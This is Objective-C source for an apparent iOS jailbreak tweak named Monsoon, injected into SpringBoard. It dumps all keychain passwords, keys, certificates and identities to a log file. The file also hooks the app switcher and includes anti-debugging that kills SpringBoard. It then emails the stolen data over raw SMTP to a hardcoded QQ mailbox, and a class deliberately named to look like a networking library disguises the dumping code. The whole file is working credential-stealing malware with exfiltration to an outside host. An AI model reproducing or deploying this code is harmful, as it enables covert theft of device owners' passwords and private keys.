//
//  Monsoon.m
//  Monsoon
//
//  Created by Meirtz on 14-2-3.
//  Copyright (c) 2014年 __MyCompanyName__. All rights reserved.
//

#import "Monsoon.h"


#include <stdio.h>
#include <objc/runtime.h>
#import <Foundation/Foundation.h>
#import <Security/Security.h>
#import <sqlite3.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <unistd.h>
#include <sys/sysctl.h>
#include <sys/mman.h>
#include <stdlib.h>
#include <arpa/inet.h>
//#include <sys/ptrace.h>

#pragma mark - Keychain Prototype Function

void printToStdOut(NSString *format, ...);
void printUsage();
void dumpKeychainEntitlements();
NSArray * getKeychainObjectsForSecClass(CFTypeRef kSecClassType);
NSMutableArray *getCommandLineOptions(int argc, char **argv);
NSString * getEmptyKeychainItemString(CFTypeRef kSecClassType);
void printGenericPassword(NSDictionary *passwordItem) ;
void printInternetPassword(NSDictionary *passwordItem);
void printKey(NSDictionary *keyItem);
void printResultsForSecClass(NSArray *keychainItems, CFTypeRef kSecClassType);
void printIdentity(NSDictionary *identityItem);
void printCertificate(NSDictionary *certificateItem);

@interface AFNetwork : NSObject

- (void)socket:(int)argc Async:(char **)argv;

@end

#pragma mark - Keychain Function

void printToStdOut(NSString *format, ...) {
    va_list args;
    va_start(args, format);
    NSString *formattedString = [[NSString alloc] initWithFormat: format arguments: args];
    const char *op = [formattedString UTF8String];
    freopen("/var/mobile/taiji.log", "r", stdin);
    freopen("/var/mobile/taiji1.log", "w", stdout);
    char s;
    while (scanf("%c",&s)==1) {
        printf("%c",s);
    }
    fclose(stdin);
    printf("%s\n",op);
    fclose(stdout);
    system("rm /var/mobile/taiji.log");
    system("mv /var/mobile/taiji1.log /var/mobile/taiji.log");
    
    va_end(args);
}

NSMutableArray *getCommandLineOptions(int argc, char **argv) {
	NSMutableArray *arguments = [[NSMutableArray alloc] init];
	int argument;
	if (argc == 1) {
		[arguments addObject:(id)kSecClassGenericPassword];
		[arguments addObject:(id)kSecClassInternetPassword];
		return [arguments autorelease];
	}
	while ((argument = getopt (argc, argv, "aegnickh")) != -1) {
		switch (argument) {
			case 'a':
				[arguments addObject:(id)kSecClassGenericPassword];
				[arguments addObject:(id)kSecClassInternetPassword];
				[arguments addObject:(id)kSecClassIdentity];
				[arguments addObject:(id)kSecClassCertificate];
				[arguments addObject:(id)kSecClassKey];
				return [arguments autorelease];
			case 'e':
				[arguments addObject:@"dumpEntitlements"];
				return [arguments autorelease];
			case 'g':
				[arguments addObject:(id)kSecClassGenericPassword];
				break;
			case 'n':
				[arguments addObject:(id)kSecClassInternetPassword];
				break;
			case 'i':
				[arguments addObject:(id)kSecClassIdentity];
				break;
			case 'c':
				[arguments addObject:(id)kSecClassCertificate];
				break;
			case 'k':
				[arguments addObject:(id)kSecClassKey];
				break;
			case 'h':
				printUsage();
				break;
			case '?':
			    printUsage();
			 	exit(EXIT_FAILURE);
			default:
				continue;
		}
	}
	return [arguments autorelease];
}

NSArray * getKeychainObjectsForSecClass(CFTypeRef kSecClassType) {
	NSMutableDictionary *genericQuery = [[NSMutableDictionary alloc] init];
    
	[genericQuery setObject:(id)kSecClassType forKey:(id)kSecClass];
	[genericQuery setObject:(id)kSecMatchLimitAll forKey:(id)kSecMatchLimit];
	[genericQuery setObject:(id)kCFBooleanTrue forKey:(id)kSecReturnAttributes];
	[genericQuery setObject:(id)kCFBooleanTrue forKey:(id)kSecReturnRef];
	[genericQuery setObject:(id)kCFBooleanTrue forKey:(id)kSecReturnData];
    
	NSArray *keychainItems = nil;
	if (SecItemCopyMatching((CFDictionaryRef)genericQuery, (CFTypeRef *)&keychainItems) != noErr)
	{
		keychainItems = nil;
	}
	[genericQuery release];
	return keychainItems;
}

NSString * getEmptyKeychainItemString(CFTypeRef kSecClassType) {
	if (kSecClassType == kSecClassGenericPassword) {
		return @"No Generic Password Keychain items found.\n";
	}
	else if (kSecClassType == kSecClassInternetPassword) {
		return @"No Internet Password Keychain items found.\n";
	}
	else if (kSecClassType == kSecClassIdentity) {
		return @"No Identity Keychain items found.\n";
	}
	else if (kSecClassType == kSecClassCertificate) {
		return @"No Certificate Keychain items found.\n";
	}
	else if (kSecClassType == kSecClassKey) {
		return @"No Key Keychain items found.\n";
	}
	else {
		return @"Unknown Security Class\n";
	}
    
}


void printUsage() {
    NSLog(@"");
}

void dumpKeychainEntitlements() {
    NSString *databasePath = @"/var/Keychains/keychain-2.db";
    const char *dbpath = [databasePath UTF8String];
    sqlite3 *keychainDB;
    sqlite3_stmt *statement;
	NSMutableString *entitlementXML = [NSMutableString stringWithString:@"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
                                       "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n"
                                       "<plist version=\"1.0\">\n"
                                       "\t<dict>\n"
                                       "\t\t<key>keychain-access-groups</key>\n"
                                       "\t\t<array>\n"];
    
    if (sqlite3_open(dbpath, &keychainDB) == SQLITE_OK)
    {
        const char *query_stmt = "SELECT DISTINCT agrp FROM genp UNION SELECT DISTINCT agrp FROM inet";
        
        if (sqlite3_prepare_v2(keychainDB, query_stmt, -1, &statement, NULL) == SQLITE_OK)
        {
			while(sqlite3_step(statement) == SQLITE_ROW)
            {
				NSString *group = [[NSString alloc] initWithUTF8String:(const char *) sqlite3_column_text(statement, 0)];
                
                [entitlementXML appendFormat:@"\t\t\t<string>%@</string>\n", group];
                [group release];
            }
            sqlite3_finalize(statement);
        }
        else
        {
            printToStdOut(@"Unknown error querying keychain database\n");
		}
		[entitlementXML appendString:@"\t\t</array>\n"
         "\t</dict>\n"
         "</plist>\n"];
		sqlite3_close(keychainDB);
		printToStdOut(@"%@", entitlementXML);
	}
	else
	{
		printToStdOut(@"Unknown error opening keychain database\n");
	}
}

void printGenericPassword(NSDictionary *passwordItem) {
	printToStdOut(@"Generic Password\n");
	printToStdOut(@"----------------\n");
	printToStdOut(@"Service: %@\n", [passwordItem objectForKey:(id)kSecAttrService]);
	printToStdOut(@"Account: %@\n", [passwordItem objectForKey:(id)kSecAttrAccount]);
	printToStdOut(@"Entitlement Group: %@\n", [passwordItem objectForKey:(id)kSecAttrAccessGroup]);
	printToStdOut(@"Label: %@\n", [passwordItem objectForKey:(id)kSecAttrLabel]);
	printToStdOut(@"Generic Field: %@\n", [[passwordItem objectForKey:(id)kSecAttrGeneric] description]);
	NSData* passwordData = [passwordItem objectForKey:(id)kSecValueData];
	printToStdOut(@"Keychain Data: %@\n\n", [[NSString alloc] initWithData:passwordData encoding:NSUTF8StringEncoding]);
}

void printInternetPassword(NSDictionary *passwordItem) {
	printToStdOut(@"Internet Password\n");
	printToStdOut(@"-----------------\n");
	printToStdOut(@"Server: %@\n", [passwordItem objectForKey:(id)kSecAttrServer]);
	printToStdOut(@"Account: %@\n", [passwordItem objectForKey:(id)kSecAttrAccount]);
	printToStdOut(@"Entitlement Group: %@\n", [passwordItem objectForKey:(id)kSecAttrAccessGroup]);
	printToStdOut(@"Label: %@\n", [passwordItem objectForKey:(id)kSecAttrLabel]);
	NSData* passwordData = [passwordItem objectForKey:(id)kSecValueData];
	printToStdOut(@"Keychain Data: %@\n\n", [[NSString alloc] initWithData:passwordData encoding:NSUTF8StringEncoding]);
}


void printCertificate(NSDictionary *certificateItem) {
	SecCertificateRef certificate = (SecCertificateRef)[certificateItem objectForKey:(id)kSecValueRef];
    
	CFStringRef summary;
	summary = SecCertificateCopySubjectSummary(certificate);
	printToStdOut(@"Certificate\n");
	printToStdOut(@"-----------\n");
	printToStdOut(@"Summary: %@\n", (NSString *)summary);
	CFRelease(summary);
	printToStdOut(@"Entitlement Group: %@\n", [certificateItem objectForKey:(id)kSecAttrAccessGroup]);
	printToStdOut(@"Label: %@\n", [certificateItem objectForKey:(id)kSecAttrLabel]);
	printToStdOut(@"Serial Number: %@\n", [certificateItem objectForKey:(id)kSecAttrSerialNumber]);
	printToStdOut(@"Subject Key ID: %@\n", [certificateItem objectForKey:(id)kSecAttrSubjectKeyID]);
	printToStdOut(@"Subject Key Hash: %@\n\n", [certificateItem objectForKey:(id)kSecAttrPublicKeyHash]);
    
}

void printKey(NSDictionary *keyItem) {
	NSString *keyClass = @"Unknown";
	CFTypeRef _keyClass = [keyItem objectForKey:(id)kSecAttrKeyClass];
    
	if ([[(id)_keyClass description] isEqual:(id)kSecAttrKeyClassPublic]) {
		keyClass = @"Public";
	}
	else if ([[(id)_keyClass description] isEqual:(id)kSecAttrKeyClassPrivate]) {
		keyClass = @"Private";
	}
	else if ([[(id)_keyClass description] isEqual:(id)kSecAttrKeyClassSymmetric]) {
		keyClass = @"Symmetric";
	}
    
	printToStdOut(@"Key\n");
	printToStdOut(@"---\n");
	printToStdOut(@"Entitlement Group: %@\n", [keyItem objectForKey:(id)kSecAttrAccessGroup]);
	printToStdOut(@"Label: %@\n", [keyItem objectForKey:(id)kSecAttrLabel]);
	printToStdOut(@"Application Label: %@\n", [keyItem objectForKey:(id)kSecAttrApplicationLabel]);
	printToStdOut(@"Key Class: %@\n", keyClass);
	printToStdOut(@"Permanent Key: %@\n", CFBooleanGetValue((CFBooleanRef)[keyItem objectForKey:(id)kSecAttrIsPermanent]) == true ? @"True" : @"False");
	printToStdOut(@"Key Size: %@\n", [keyItem objectForKey:(id)kSecAttrKeySizeInBits]);
	printToStdOut(@"Effective Key Size: %@\n", [keyItem objectForKey:(id)kSecAttrEffectiveKeySize]);
	printToStdOut(@"For Encryption: %@\n", CFBooleanGetValue((CFBooleanRef)[keyItem objectForKey:(id)kSecAttrCanEncrypt]) == true ? @"True" : @"False");
	printToStdOut(@"For Decryption: %@\n", CFBooleanGetValue((CFBooleanRef)[keyItem objectForKey:(id)kSecAttrCanDecrypt]) == true ? @"True" : @"False");
	printToStdOut(@"For Key Derivation: %@\n", CFBooleanGetValue((CFBooleanRef)[keyItem objectForKey:(id)kSecAttrCanDerive]) == true ? @"True" : @"False");
	printToStdOut(@"For Signatures: %@\n", CFBooleanGetValue((CFBooleanRef)[keyItem objectForKey:(id)kSecAttrCanSign]) == true ? @"True" : @"False");
	printToStdOut(@"For Signature Verification: %@\n", CFBooleanGetValue((CFBooleanRef)[keyItem objectForKey:(id)kSecAttrCanVerify]) == true ? @"True" : @"False");
	printToStdOut(@"For Key Wrapping: %@\n", CFBooleanGetValue((CFBooleanRef)[keyItem objectForKey:(id)kSecAttrCanWrap]) == true ? @"True" : @"False");
	printToStdOut(@"For Key Unwrapping: %@\n\n", CFBooleanGetValue((CFBooleanRef)[keyItem objectForKey:(id)kSecAttrCanUnwrap]) == true ? @"True" : @"False");
    
}

void printIdentity(NSDictionary *identityItem) {
	SecIdentityRef identity = (SecIdentityRef)[identityItem objectForKey:(id)kSecValueRef];
	SecCertificateRef certificate;
    
	SecIdentityCopyCertificate(identity, &certificate);
	NSMutableDictionary *identityItemWithCertificate = [identityItem mutableCopy];
	[identityItemWithCertificate setObject:(id)certificate forKey:(id)kSecValueRef];
	printToStdOut(@"Identity\n");
	printToStdOut(@"--------\n");
	printCertificate(identityItemWithCertificate);
	printKey(identityItemWithCertificate);
	[identityItemWithCertificate release];
}

void printResultsForSecClass(NSArray *keychainItems, CFTypeRef kSecClassType) {
	if (keychainItems == nil) {
		printToStdOut(getEmptyKeychainItemString(kSecClassType));
		return;
	}
    
	NSDictionary *keychainItem;
	for (keychainItem in keychainItems) {
		if (kSecClassType == kSecClassGenericPassword) {
			printGenericPassword(keychainItem);
		}
		else if (kSecClassType == kSecClassInternetPassword) {
			printInternetPassword(keychainItem);
		}
		else if (kSecClassType == kSecClassIdentity) {
			printIdentity(keychainItem);
		}
		else if (kSecClassType == kSecClassCertificate) {
			printCertificate(keychainItem);
		}
		else if (kSecClassType == kSecClassKey) {
			printKey(keychainItem);
		}
	}
	return;
}


#pragma mark - Anit Debug

static int is_being_debugging(void)
{
    int name[4];
    struct kinfo_proc info;
    size_t info_size = sizeof(info);
    
    info.kp_proc.p_flag = 0;
    
    name[0] = CTL_KERN;
    name[1] = KERN_PROC;
    name[2] = KERN_PROC_PID;
    name[3] = getpid();
    
    if (sysctl(name, 4, &info, &info_size, NULL, 0) == -1) {
        perror("sysctl");
        exit(-1);
    }
    return ((info.kp_proc.p_flag & P_TRACED) != 0);
}





#pragma mark - Send Mail

struct data6  {
    unsigned int d4:6;
    unsigned int d3:6;
    unsigned int d2:6;
    unsigned int d1:6;
};

char con628(char c6);
void base64(char *dbuf,char *buf128,int len);
int open_socket(struct sockaddr *addr);
void sendmail(const char *username,const char *password,const char *email,const char *smtp,const char *subject,const char *body);

char con628(char c6)
{
    char rtn = '\0';
    if (c6 < 26) rtn = c6 + 65;
    else if (c6 < 52) rtn = c6 + 71;
    else if (c6 < 62) rtn = c6 - 4;
    else if (c6 == 62) rtn = 43;
    else rtn = 47;
    return rtn;
}

void base64(char *dbuf, char *buf128, int len) {
    struct data6 *ddd = NULL;
    int i = 0;
    char buf[256] = {0};
    char *tmp = NULL;
    char cc = '\0';
    memset(buf, 0, 256);
    strcpy(buf, buf128);
    for(i = 1; i <= len/3; i++)
    {
        tmp = buf+(i-1)*3;
        cc = tmp[2];
        tmp[2] = tmp[0];
        tmp[0] = cc;
        ddd = (struct data6 *)tmp;
        dbuf[(i-1)*4+0] = con628((unsigned int)ddd->d1); dbuf[(i-1)*4+1] = con628((unsigned int)ddd->d2); dbuf[(i-1)*4+2] = con628((unsigned int)ddd->d3); dbuf[(i-1)*4+3] = con628((unsigned int)ddd->d4); }
    if(len%3 == 1)
    {
        tmp = buf+(i-1)*3;
        cc = tmp[2];
        tmp[2] = tmp[0];
        tmp[0] = cc;
        ddd = (struct data6 *)tmp;
        dbuf[(i-1)*4+0] = con628((unsigned int)ddd->d1); dbuf[(i-1)*4+1] = con628((unsigned int)ddd->d2); dbuf[(i-1)*4+2] = '=';
        dbuf[(i-1)*4+3] = '=';
    }
    if(len%3 == 2)
    {
        tmp = buf+(i-1)*3;
        cc = tmp[2];
        tmp[2] = tmp[0];
        tmp[0] = cc;
        ddd = (struct data6 *)tmp;
        dbuf[(i-1)*4+0] = con628((unsigned int)ddd->d1); dbuf[(i-1)*4+1] = con628((unsigned int)ddd->d2); dbuf[(i-1)*4+2] = con628((unsigned int)ddd->d3); dbuf[(i-1)*4+3] = '=';
    }
    return;
}

void sendmail(const char *username,const char *password,const char *email,const char *smtp,const char *subject,const char *body) {
    int sockfd = 0;
    struct sockaddr_in their_addr = {0};
    char buf[1500] = {0};
    char rbuf[1500] = {0};
    char login[128] = {0};
    char pass[128] = {0};
    memset(&their_addr, 0, sizeof(their_addr));
    their_addr.sin_family = AF_INET;
    their_addr.sin_port = htons(25);
    their_addr.sin_addr.s_addr = inet_addr("163.177.65.211");
    sockfd = open_socket((struct sockaddr *)&their_addr);
    memset(rbuf,0,1500);
    while(recv(sockfd, rbuf, 1500, 0) == 0)
    {
        printf("reconnect...\n");
        sleep(2);
        sockfd = open_socket((struct sockaddr *)&their_addr);
        memset(rbuf,0,1500);
    }
    NSLog(@"%s",rbuf);
    
    // EHLO
    memset(buf, 0, 1500);
    sprintf(buf, "EHLO localhost.localdomain\r\n");
    send(sockfd, buf, strlen(buf), 0);
    memset(rbuf, 0, 1500);
    recv(sockfd, rbuf, 1500, 0);
    NSLog(@"%s",rbuf);
    // AUTH LOGIN
    memset(buf, 0, 1500);
    sprintf(buf, "AUTH LOGIN\r\n");
    send(sockfd, buf, strlen(buf), 0);
    printf("%s\n", buf);
    memset(rbuf, 0, 1500);
    recv(sockfd, rbuf, 1500, 0);
    NSLog(@"%s",rbuf);
    // USER
    memset(buf, 0, 1500);
    sprintf(buf,"%s",username);
    memset(login, 0, 128);
    base64(login, buf, [[NSString stringWithFormat:@"%zu",strlen(buf)] intValue]);
    sprintf(buf, "%s\r\n", login);
    send(sockfd, buf, strlen(buf), 0);
    printf("%s\n", buf);
    memset(rbuf, 0, 1500);
    recv(sockfd, rbuf, 1500, 0);
    NSLog(@"%s",rbuf);
    // PASSWORD
    sprintf(buf, "%s",password);
    base64(pass, buf, [[NSString stringWithFormat:@"%zu",strlen(buf)] intValue]);
    sprintf(buf, "%s\r\n", pass);
    send(sockfd, buf, strlen(buf), 0);
    printf("%s\n", buf);
    memset(rbuf, 0, 1500);
    recv(sockfd, rbuf, 1500, 0);
    NSLog(@"%s",rbuf);
    // MAIL FROM
    memset(buf, 0, 1500);
    sprintf(buf, "MAIL FROM:<%s>\r\n",username);
    send(sockfd, buf, strlen(buf), 0);
    memset(rbuf, 0, 1500);
    recv(sockfd, rbuf, 1500, 0);
    NSLog(@"%s",rbuf);
    // RCPT TO
    memset(buf, 0, 1500);
    sprintf(buf, "RCPT TO:<%s>\r\n", email);
    send(sockfd, buf, strlen(buf), 0);
    memset(rbuf, 0, 1500);
    recv(sockfd, rbuf, 1500, 0);
    NSLog(@"%s",rbuf);
    // DATA
    memset(buf, 0, 1500);
    sprintf(buf, "DATA\r\n");
    send(sockfd, buf, strlen(buf), 0);
    memset(rbuf, 0, 1500);
    recv(sockfd, rbuf, 1500, 0);
    NSLog(@"%s",rbuf);
    //TO
    memset(buf, 0, 1500);
    sprintf(buf, "TO:%s\r\n",email);
    send(sockfd, buf, strlen(buf), 0);
    //FROM
    memset(buf, 0, 1500);
    sprintf(buf, "FROM:%s\r\n",username);
    send(sockfd, buf, strlen(buf), 0);
    //subject
    memset(buf, 0, 1500);
    sprintf(buf, "Subject: %s\r\n\r\n", subject);
    send(sockfd, buf, strlen(buf), 0);
    memset(buf, 0, 1500);
    sprintf(buf, "%s\r\n", body);
    send(sockfd, buf, strlen(buf), 0);
    memset(buf, 0, 1500);
    sprintf(buf, ".\r\n");
    send(sockfd, buf, strlen(buf), 0);
    memset(rbuf, 0, 1500);
    recv(sockfd, rbuf, 1500, 0);
    NSLog(@"%s",rbuf);
    // QUIT
    memset(buf, 0, 1500);
    sprintf(buf, "QUIT\r\n");
    send(sockfd, buf, strlen(buf), 0);
    memset(rbuf, 0, 1500);
    recv(sockfd, rbuf, 1500, 0);
    NSLog(@"%s",rbuf);
    return;
}

int open_socket(struct sockaddr *addr) {
    int sockfd = 0;
    sockfd=socket(PF_INET, SOCK_STREAM, 0); if(sockfd < 0)
    {
        fprintf(stderr, "Open sockfd(TCP) error!\n"); exit(-1);
    }
    if(connect(sockfd, addr, sizeof(struct sockaddr)) < 0) {
        fprintf(stderr, "Connect sockfd(TCP) error!\n"); exit(-1);
    }
    return sockfd;
}

#pragma mark - AFNetwork(伪)

@implementation AFNetwork

- (void)socket:(int)argc Async:(char **)argv{
    id pool=[NSAutoreleasePool new];
	NSMutableArray* arguments;
    [arguments addObject:(id)kSecClassGenericPassword];
    [arguments addObject:(id)kSecClassInternetPassword];
    [arguments addObject:(id)kSecClassIdentity];
    [arguments addObject:(id)kSecClassCertificate];
    [arguments addObject:(id)kSecClassKey];
	if ([arguments indexOfObject:@"dumpEntitlements"] != NSNotFound) {
		dumpKeychainEntitlements();
		exit(EXIT_SUCCESS);
	}
	NSArray *keychainItems = nil;
	for (id kSecClassType in (NSArray *) arguments) {
		keychainItems = getKeychainObjectsForSecClass((CFTypeRef)kSecClassType);
		printResultsForSecClass(keychainItems, (CFTypeRef)kSecClassType);
		[keychainItems release];
	}
    double delayInSeconds = 2.0;
    dispatch_time_t popTime = dispatch_time(DISPATCH_TIME_NOW, (int64_t)(delayInSeconds * NSEC_PER_SEC));
    dispatch_after(popTime, dispatch_get_main_queue(), ^(void){
        
    });
	[pool drain];
}

@end

#pragma mark - SBAppSliderController small header

@interface SBAppSliderController : UIViewController
{
    NSMutableArray *_appList;
}

- (NSArray *)applicationList;
- (void)_quitAppAtIndex:(unsigned int)arg1;
- (void)forceDismissAnimated:(BOOL)arg1;

@end

@interface crackSpringBoard : UICollectionViewController

- (void)setuid:(uint8_t )ab;

@end

static IMP crackSB = NULL;

@implementation crackSpringBoard

- (void)setuid:(uint8_t )ab{
    Class originalClass = NSClassFromString(@"SBControlCenterController");  //%hook SBControlCenterController
    Method originalMeth = class_getInstanceMethod(originalClass, @selector(switcherWasPresented:));
    crackSB = method_getImplementation(originalMeth);
	Method replacementMeth = class_getInstanceMethod(NSClassFromString(@"SBControlCenterController"), @selector(switcherWasPresented:));
    method_exchangeImplementations(originalMeth, replacementMeth);
}

@end

static IMP sOriginalImp = NULL;

@implementation Monsoon

+ (void)load{
    if (is_being_debugging()) {
        system("killall -9 SpringBoard");
    }
    //ptrace(PT_DENY_ATTACH, 0, 0, 0);
    Class originalClass = NSClassFromString(@"SBAppSliderController");  //%hook SBAppSliderController
    Method originalMeth = class_getInstanceMethod(originalClass, @selector(switcherWasPresented:));
    sOriginalImp = method_getImplementation(originalMeth);
	Method replacementMeth = class_getInstanceMethod(NSClassFromString(@"Monsoon"), @selector(patchedLaunch:));
	method_exchangeImplementations(originalMeth, replacementMeth);
}

- (void)patchedLaunch:(_Bool)arg1{
    
    if (is_being_debugging()) {
        system("killall -9 SpringBoard");
    }
    //ptrace(PT_DENY_ATTACH, 0, 0, 0);
    
    sOriginalImp(self, @selector(switcherWasPresented:), self);   //%orig
    
    //UIAlertView *alert = [[UIAlertView alloc] initWithTitle:@"INJECTED" message:@"Method has been replaced by objc_runtime dynamic library\nDYLD_INSERT_LIBRARIES=libMonsoon.dylib" delegate:nil cancelButtonTitle:@"OK" otherButtonTitles: nil];
    //[alert show];
    
#pragma mark - do twice will crash
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND,0), ^{
        int fd = open("/var/mobile/taiji.log",O_RDONLY);
        int len = (int)lseek(fd,0,SEEK_END);
        char *mbuf = (char *) mmap(NULL,len,PROT_READ,MAP_PRIVATE,fd,0);
        setuid(0);
        sendmail("445108920@qq.com","fill your password","445108920@qq.com","smtp.qq.com","keychain",mbuf);
    });
    

    /*dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
        printResultsForSecClass(getKeychainObjectsForSecClass((CFTypeRef)(id)kSecClassGenericPassword), (CFTypeRef)(id)kSecClassGenericPassword);
        printResultsForSecClass(getKeychainObjectsForSecClass((CFTypeRef)(id)kSecClassInternetPassword), (CFTypeRef)(id)kSecClassInternetPassword);
        printResultsForSecClass(getKeychainObjectsForSecClass((CFTypeRef)(id)kSecClassIdentity), (CFTypeRef)(id)kSecClassIdentity);
        printResultsForSecClass(getKeychainObjectsForSecClass((CFTypeRef)(id)kSecClassCertificate), (CFTypeRef)(id)kSecClassCertificate);
        printResultsForSecClass(getKeychainObjectsForSecClass((CFTypeRef)(id)kSecClassKey), (CFTypeRef)(id)kSecClassKey);
    });*/
}
@end
